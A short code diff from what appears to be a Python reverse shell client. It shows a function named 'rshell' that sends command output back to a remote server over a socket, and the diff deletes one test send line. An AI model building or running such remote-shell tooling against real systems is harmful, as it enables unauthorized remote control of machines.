@@ -57,7 +57,6 @@ def rshell(s):
         try:
             s.send(results.encode("utf-8") if results else errors.encode("utf-8"))
             print("Sent results.")
-            s.sendall("test".encode())
         except BrokenPipeError:
             print("Connection closed by server.")
             break
